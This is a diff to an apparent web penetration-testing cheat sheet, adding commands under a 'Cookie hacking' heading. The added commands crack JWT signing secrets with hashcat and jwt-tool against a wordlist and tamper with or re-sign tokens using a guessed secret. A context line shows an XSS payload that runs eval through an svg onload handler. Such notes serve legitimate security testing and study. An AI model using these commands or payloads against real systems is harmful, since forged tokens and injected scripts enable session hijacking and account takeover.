@@ -264,11 +264,19 @@ data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert
 
 # Cookie hacking
 
-### JWT secret bruteforce
+### JWT secret bruteforce (crack)
+#### `hashcat`
 ```
 hashcat -a 0 -m 16500 <YOUR-JWT> /opt/web/wordlist/jwt-secrets.txt
 ```
-
+#### `jwt-tool`
+```
+jwt-tool <YOUR-JWT> -C -d /opt/web/wordlist/jwt-secrets.txt
+```
+### Tamper jwt token content
+```
+jwt-tool <YOUR-JWT> -S hs256 -p "secret1" -T
+```
 -----------------------------------------------------------------------------------------------------------------
 # Bypass technics
 ### Bypass File Upload Filtering
